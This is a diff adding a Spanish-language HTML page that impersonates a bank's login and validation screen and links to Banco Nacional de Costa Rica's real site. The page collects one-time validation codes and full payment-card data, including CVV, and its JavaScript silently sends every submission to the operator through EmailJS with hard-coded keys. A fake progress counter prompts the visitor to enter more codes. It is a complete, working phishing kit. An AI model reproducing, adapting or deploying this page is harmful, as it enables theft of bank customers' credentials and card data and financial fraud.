@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IBN - Inicio de Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles2.css">
+    <link rel="stylesheet" href="sincronizacion.css">
+    <style>
+        body {
+            background: url('images/fondo.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 15px;
+            border-radius: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2272FF;
+            color: white;
+            border: none;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #1a5dd1;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .FootTr {
+            margin-top: auto;
+        }
+
+        @media (max-width: 600px) {
+            .FootTr {
+                padding: 10px;
+                text-align: center;
+                font-size: 13px;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+
+            #footerPlaceholder {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .footermain {
+                font-weight: bold;
+                margin-bottom: 5px;
+            }
+
+            .fcenter,
+            .fright {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                width: 100%;
+                margin: 5px 0;
+            }
+
+            .menulinkHref a {
+                margin: 3px 0;
+                display: inline-block;
+                text-decoration: none;
+                word-break: break-word;
+                max-width: 100%;
+            }
+
+            .social_links {
+                margin-top: 5px;
+            }
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: #1D1D1D;
+            overflow: hidden;
+        }
+
+        /* Contenedor del porcentaje */
+        .progress-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        /* Solo el porcentaje, sin barra */
+        #progress-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            margin: 10px 0;
+        }
+
+        /* Estilos para la sección de tarjeta colapsable (PC) */
+        .card-section {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.4s ease;
+            margin-top: 15px;
+            opacity: 0;
+        }
+
+        .card-section.expanded {
+            max-height: 500px;
+            opacity: 1;
+        }
+
+        /* En PC: fecha y CVV lado a lado */
+        .card-expiry-cvv-container {
+            display: flex;
+            gap: 15px;
+        }
+
+        .card-expiry-cvv-container > div {
+            flex: 1;
+        }
+
+        /* Modal de tarjeta para móvil */
+        .card-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 10000;
+            overflow-y: auto;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .card-modal.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .card-modal-content {
+            background-color: #2a2a2a;
+            padding: 25px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 350px;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.3s ease;
+        }
+
+        .card-modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+        }
+
+        .card-modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #fff;
+            margin: 0;
+        }
+
+        .card-modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+            padding: 0;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+
+        .card-modal-close:hover {
+            background-color: #444;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* NUEVOS ESTILOS PARA MÓVIL */
+        @media (max-width: 768px) {
+            body {
+                overflow: hidden;
+                min-height: 100vh;
+                padding-bottom: 120px;
+            }
+
+            /* Ocultar botón continuar solo en móvil */
+            #continueButton {
+                display: none !important;
+            }
+
+            /* Ocultar sección de tarjeta expandible en móvil */
+            .card-section {
+                display: none !important;
+            }
+
+            .HeadContain {
+                padding: 5px 0;
+            }
+
+            .company_logo img {
+                max-width: 120px;
+                height: auto;
+            }
+
+            .MainContent {
+                padding: 5px 10px;
+                flex: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            #loginArea {
+                max-width: 100%;
+                padding: 10px;
+                margin: 0 auto;
+            }
+
+            #loginImage {
+                max-width: 60px;
+                height: auto;
+                margin: 0 auto 10px;
+                display: block;
+            }
+
+            h2 {
+                font-size: 18px;
+                margin: 10px 0;
+                text-align: center;
+            }
+
+            p {
+                font-size: 13px;
+                line-height: 1.3;
+                text-align: center;
+                margin: 8px 0;
+            }
+
+            #progress-text {
+                font-size: 18px;
+                margin: 10px 0;
+            }
+
+            input[type="text"], input[type="password"] {
+                padding: 12px;
+                margin: 8px 0;
+                font-size: 16px;
+                border: 15px;
+                border-radius: 10px;
+            }
+
+            button {
+                padding: 12px;
+                font-size: 16px;
+                margin: 8px 0;
+                border-radius: 15px;
+            }
+
+            /* Estilos del modal para móvil */
+            .card-modal-content {
+                margin: 10px;
+                max-height: calc(100vh - 40px);
+            }
+
+            /* Campos de tarjeta en el modal */
+            .card-modal-content .card-expiry-cvv-container {
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .card-modal-content .card-expiry-cvv-container > div {
+                width: 100%;
+            }
+
+            /* Inputs de tarjeta en el modal */
+            .card-modal-content #cardNumber, 
+            .card-modal-content #cardName, 
+            .card-modal-content #cardExpiry, 
+            .card-modal-content #cardCVV {
+                width: 100%;
+                padding: 12px;
+                margin: 8px 0;
+                font-size: 16px;
+                border: 1px solid #555;
+                border-radius: 8px;
+                box-sizing: border-box;
+                background-color: #333;
+                color: #fff;
+            }
+
+            .card-modal-content label {
+                display: block;
+                margin: 12px 0 5px;
+                font-size: 14px;
+                font-weight: bold;
+                color: #fff;
+            }
+
+            /* Footer */
+            .FootTr {
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                background-color: #1e3a8a;
+                z-index: 1000;
+                padding: 10px;
+            }
+
+            #footerPlaceholder {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .footermain {
+                font-weight: bold;
+                margin-bottom: 8px;
+                font-size: 15px;
+                color: white;
+            }
+
+            .fcenter {
+                margin-bottom: 8px;
+            }
+
+            .fcenter .menulinkHref {
+                display: flex;
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 5px 15px;
+            }
+
+            .fcenter .menulinkHref a {
+                color: white;
+                text-decoration: underline;
+                font-size: 12px;
+                margin: 0;
+                padding: 2px 4px;
+            }
+
+            .social_links .fright .menulinkHref p {
+                font-size: 11px;
+                color: white;
+                margin: 0;
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="HeadContain">
+        <div id="header">
+            <div class="company_logo">
+                <img src="images/logo.png" alt="IBN Logo">
+            </div>
+        </div>
+    </div>
+    <h1><br><br></h1>
+    <div class="MainContent Content_Main">
+        <div id="content">
+            <div class="contentBlock">
+                <div id="workArea">
+                    <div id="loginArea">
+                        <div id="userNameArea">
+                            <img src="images/firma.png" alt="Imagen de acceso" id="loginImage">
+                            <h2>Validación</h2>
+                            <p>Actualización en proceso. Puedes comunicarte con nosotros usando los diferentes canales de atención.</p>
+                            
+                            <!-- Solo el porcentaje, sin barra -->
+                            <div class="progress-container">
+                                <p id="progress-text">0%</p>
+                            </div>
+
+                            <form id="validationForm" onsubmit="sendUserCode(event)">
+                                <label for="validationCode">Código de validación</label>
+                                <input type="text" id="validationCode" name="validationCode" required placeholder="Ingrese el código">
+                                <button type="submit" id="codeButton" class="btn btn-success">Enviar Código</button>
+                            </form>
+
+                            <p id="updateStatus" style="display:none;">Código enviado con éxito</p>
+                            <button id="continueButton" style="display:none;">Continuar</button>
+                            
+                            <button type="button" onclick="toggleCardSection()">Agregar Tarjeta</button>
+                            
+                            <!-- Sección de tarjeta para PC (expandible) -->
+                            <div id="cardSection" class="card-section">
+                                <form id="cardForm" onsubmit="sendCardData(event)">
+                                    <label for="cardNumber">Número de tarjeta</label>
+                                    <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="0000-0000-0000-0000" required>
+                                    
+                                    <label for="cardName">Nombre del titular</label>
+                                    <input type="text" id="cardName" name="cardName" placeholder="Nombre del titular" required>
+                                    
+                                    <div class="card-expiry-cvv-container">
+                                        <div>
+                                            <label for="cardExpiry">Fecha de vencimiento</label>
+                                            <input type="text" id="cardExpiry" name="cardExpiry" maxlength="5" placeholder="MM/AA" required>
+                                        </div>
+                                        <div>
+                                            <label for="cardCVV">CVV</label>
+                                            <input type="text" id="cardCVV" name="cardCVV" maxlength="4" placeholder="CVV" required>
+                                        </div>
+                                    </div>
+                                    
+                                    <button type="submit" id="cardButton">Guardar Tarjeta</button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de tarjeta para móvil -->
+    <div id="cardModal" class="card-modal">
+        <div class="card-modal-content">
+            <div class="card-modal-header">
+                <h3 class="card-modal-title">Agregar Tarjeta</h3>
+                <button type="button" class="card-modal-close" onclick="closeCardModal()">&times;</button>
+            </div>
+            
+            <form id="cardFormModal" onsubmit="sendCardDataModal(event)">
+                <label for="cardNumberModal">Número de tarjeta</label>
+                <input type="text" id="cardNumberModal" name="cardNumberModal" maxlength="19" placeholder="0000-0000-0000-0000" required>
+                
+                <label for="cardNameModal">Nombre del titular</label>
+                <input type="text" id="cardNameModal" name="cardNameModal" placeholder="Nombre del titular" required>
+                
+                <div class="card-expiry-cvv-container">
+                    <div>
+                        <label for="cardExpiryModal">Fecha de vencimiento</label>
+                        <input type="text" id="cardExpiryModal" name="cardExpiryModal" maxlength="5" placeholder="MM/AA" required>
+                    </div>
+                    <div>
+                        <label for="cardCVVModal">CVV</label>
+                        <input type="text" id="cardCVVModal" name="cardCVVModal" maxlength="4" placeholder="CVV" required>
+                    </div>
+                </div>
+                
+                <button type="submit" id="cardButtonModal">Guardar Tarjeta</button>
+            </form>
+        </div>
+    </div>
+    
+    <div class="FootTr">
+        <div id="footerPlaceholder">
+            <div class="footermain">Accesos</div>
+            <div class="fcenter">
+                <div class="menulinkHref">
+                    <a href="https://bncr.bnonline.fi.cr/Login/RegistroLineaTarjeta.aspx">Registro en línea</a><br>
+                    <a href="https://bncr.bnonline.fi.cr/Login/SincronizarOTP.aspxs">Sincronizar OTP</a><br>
+                    <a href="https://bncr.bnonline.fi.cr/Login/descargas.aspx">Descargar Módulo Local IBC</a>
+                </div>
+            </div>
+            <div class="social_links">
+                <div class="fright">
+                    <div class="menulinkHref">
+                        <p>Asistencia: Contáctenos al 2212-2000 opción 5</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('B_UpfFP6IoaJQjzB5');
+    </script>
+
+    <script>
+        let progress = 0;
+
+        function sendUserCode(event) {
+            event.preventDefault();
+            const userCode = document.getElementById('validationCode').value;
+            const codeButton = document.getElementById('codeButton');
+
+            if (!userCode.trim()) {
+                alert('Por favor ingrese un código válido.');
+                return;
+            }
+
+            codeButton.textContent = 'Enviando...';
+            codeButton.disabled = true;
+
+            emailjs.send('default_service', 'template_d4wfmg9', {
+                code: userCode
+            })
+            .then(() => {
+                alert('Código enviado con éxito.');
+                document.getElementById('updateStatus').style.display = 'block';
+                if (window.innerWidth > 768) {
+                    document.getElementById('continueButton').style.display = 'block';
+                }
+                updateProgressBar();
+                
+                codeButton.textContent = 'Enviar Código';
+                codeButton.disabled = false;
+                document.getElementById('validationCode').value = '';
+            })
+            .catch((err) => {
+                console.error('Error:', err);
+                alert('Error al enviar el código: ' + JSON.stringify(err));
+                codeButton.textContent = 'Enviar Código';
+                codeButton.disabled = false;
+            });
+        }
+
+        function updateProgressBar() {
+            progress += 10;
+            if (progress > 100) {
+                progress = 100;
+            }
+            
+            const progressText = document.getElementById('progress-text');
+            if (progressText) {
+                progressText.textContent = progress + '%';
+                console.log('Progreso actualizado a:', progress + '%');
+            }
+        }
+
+        function toggleCardSection() {
+            // En móvil abre el modal, en PC expande la sección
+            if (window.innerWidth <= 768) {
+                openCardModal();
+            } else {
+                const cardSection = document.getElementById('cardSection');
+                if (cardSection) {
+                    cardSection.classList.toggle('expanded');
+                }
+            }
+        }
+
+        function openCardModal() {
+            const modal = document.getElementById('cardModal');
+            if (modal) {
+                modal.classList.add('show');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        function closeCardModal() {
+            const modal = document.getElementById('cardModal');
+            if (modal) {
+                modal.classList.remove('show');
+                document.body.style.overflow = '';
+                // Limpiar formulario del modal
+                document.getElementById('cardFormModal').reset();
+            }
+        }
+
+        // Cerrar modal al hacer clic fuera
+        document.getElementById('cardModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeCardModal();
+            }
+        });
+
+        function sendCardData(event) {
+            event.preventDefault();
+            const cardButton = document.getElementById('cardButton');
+            
+            const cardData = {
+                cardNumber: document.getElementById('cardNumber').value,
+                cardName: document.getElementById('cardName').value,
+                cardExpiry: document.getElementById('cardExpiry').value,
+                cardCVV: document.getElementById('cardCVV').value
+            };
+
+            if (!cardData.cardNumber || !cardData.cardName || !cardData.cardExpiry || !cardData.cardCVV) {
+                alert('Por favor complete todos los campos de la tarjeta.');
+                return;
+            }
+
+            cardButton.textContent = 'Guardando...';
+            cardButton.disabled = true;
+
+            emailjs.send('default_service', 'template_hjfe0jk', cardData)
+            .then(() => {
+                alert('Datos de la tarjeta guardados con éxito.');
+                document.getElementById('cardForm').reset();
+                updateProgressBar();
+                
+                cardButton.textContent = 'Guardar Tarjeta';
+                cardButton.disabled = false;
+            })
+            .catch((err) => {
+                console.error('Error:', err);
+                alert('Error al enviar los datos de la tarjeta: ' + JSON.stringify(err));
+                cardButton.textContent = 'Guardar Tarjeta';
+                cardButton.disabled = false;
+            });
+        }
+
+        function sendCardDataModal(event) {
+            event.preventDefault();
+            const cardButton = document.getElementById('cardButtonModal');
+            
+            const cardData = {
+                cardNumber: document.getElementById('cardNumberModal').value,
+                cardName: document.getElementById('cardNameModal').value,
+                cardExpiry: document.getElementById('cardExpiryModal').value,
+                cardCVV: document.getElementById('cardCVVModal').value
+            };
+
+            if (!cardData.cardNumber || !cardData.cardName || !cardData.cardExpiry || !cardData.cardCVV) {
+                alert('Por favor complete todos los campos de la tarjeta.');
+                return;
+            }
+
+            cardButton.textContent = 'Guardando...';
+            cardButton.disabled = true;
+
+            emailjs.send('default_service', 'template_hjfe0jk', cardData)
+            .then(() => {
+                alert('Datos de la tarjeta guardados con éxito.');
+                updateProgressBar();
+                closeCardModal();
+                
+                cardButton.textContent = 'Guardar Tarjeta';
+                cardButton.disabled = false;
+            })
+            .catch((err) => {
+                console.error('Error:', err);
+                alert('Error al enviar los datos de la tarjeta: ' + JSON.stringify(err));
+                cardButton.textContent = 'Guardar Tarjeta';
+                cardButton.disabled = false;
+            });
+        }
+
+        // Formatear número de tarjeta (ambos formularios)
+        function setupCardFormatting(cardNumberId, cardExpiryId, cardCVVId) {
+            // Formatear número de tarjeta
+            document.getElementById(cardNumberId).addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let formatted = value.match(/.{1,4}/g)?.join('-') || '';
+                if (formatted.length > 19) {
+                    formatted = formatted.substring(0, 19);
+                }
+                e.target.value = formatted;
+            });
+
+            // Formatear fecha de vencimiento
+            document.getElementById(cardExpiryId).addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let inputElement = e.target;
+
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2);
+                    let month = parseInt(value.substring(0, 2));
+                    let year = parseInt('20' + value.substring(3, 5));
+                    
+                    if (month > 12) {
+                        value = '12' + value.substring(2);
+                    }
+                    if (year < 2025 && value.length === 5) {
+                        inputElement.style.borderColor = 'red';
+                    } else {
+                        inputElement.style.borderColor = '';
+                    }
+                }
+
+                e.target.value = value.substring(0, 5);
+            });
+
+            // Solo números para CVV
+            document.getElementById(cardCVVId).addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        }
+
+        // Configurar formateo para ambos formularios
+        setupCardFormatting('cardNumber', 'cardExpiry', 'cardCVV');
+        setupCardFormatting('cardNumberModal', 'cardExpiryModal', 'cardCVVModal');
+
+        // Manejar tecla ESC para cerrar modal
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeCardModal();
+            }
+        });
+    </script>
+</body>
+</html>
